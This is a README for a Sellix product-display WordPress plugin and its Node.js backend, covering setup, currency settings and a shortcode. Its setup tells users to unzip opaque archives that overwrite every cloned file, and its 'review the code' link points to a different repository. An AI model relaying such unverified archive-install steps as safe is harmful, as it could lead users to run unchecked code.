# Sellix Manage Products WordPress Plugin (Sellix.io WordPress Plugin) + Node.js Backend v1.5

## Getting Started

You will need Node.js running for the backend to work and a way to expose the backend API publicly as locally will not work unless you are able to route your traffic.

### Setting Up The Backend

1. **Clone the repository**

    ```bash
    git clone https://github.com/CloudRack-Development/wordpress-sellix-plugin-and-node-backend.git
    ```

2. **Navigate to the project directory**

    ```bash
    cd wordpress-sellix-plugin-and-node-backend
    ```

3. **Unzip the necessary files**

    Before unzipping the zip folder, you may review the backend code located [Here](https://github.com/CloudRack-Development/my-project//raw/main/backend.zip) to ensure reliability and security.

    ```bash
    unzip node-backend.zip && unzip sellix-product-display.zip
    ```

    You will be `prompted two times` to replace the files that are unzipped Press `Shift+A` after which press `Enter` now do this one more time.
    This will replace all the files with the new updated Zipped Files.

4. **Clean up the unnecessary zip files**

    ```bash
    rm -rf node-backend.zip
    ```

5. **Edit the `.env` file**

    Make sure to fill out the `.env` file first prior to running. You can copy the example file and edit it:

    ```bash
    cd backend/
    cp .env.example .env
    nano .env
    ```

6. **Install dependencies and start the backend**

    ```bash
    npm install
    npm run start
    ```

# Sellix Product Display Plugin

The Sellix Product Display Plugin allows you to fetch and display products from Sellix.io on your WordPress site. It also includes currency conversion using the Free Currency API and optional rounding for product prices.

## Installation

1. **Download the Plugin:**
   - Download the plugin files. Located [HERE](https://github.com/CloudRack-Development/wordpress-sellix-plugin-and-node-backend/raw/main/sellix-product-display.zip)

2. **Upload the Plugin:**
   - Go to your WordPress dashboard.
   - Navigate to `Plugins` > `Add New`.
   - Click on `Upload Plugin`.
   - Select the downloaded plugin zip file and click `Install Now`.

3. **Activate the Plugin:**
   - After installation, click `Activate` to activate the plugin.

## Configuration

1. **API Settings:**
   - Go to `Settings` > `Sellix Product Display`.
   - Enter your `API Base URL`.  Defined in backend how to setup.
   - Enter your `Free Currency API Key`.
   - Select your preferred currency from the dropdown menu.
   - Select the rounding option for prices (None, Quarter Dollar, Half Dollar, Whole Dollar).

2. **Save Settings:**
   - Click `Save Changes` to save your API and currency settings.

## Usage

1. **Add Shortcode:**
   - Add the `[sellix_products]` shortcode to any post or page where you want to display Sellix products.

2. **View Products:**
   - Visit the page or post where you added the shortcode to see the products displayed.

## Rounding Prices

The plugin allows you to round prices to the nearest half dollar or whole dollar. You can select the rounding option in the settings page.

## Uninstall

To uninstall the plugin:
1. Deactivate the plugin from the `Plugins` page.
2. Delete the plugin from the `Plugins` page.

## Support

For support, join our [Discord](https://discord.gg/MKnNmVNnPY).

---

**Version:** 1.5
**Author:** [Cloudrack Development](https://discord.gg/MKnNmVNnPY)

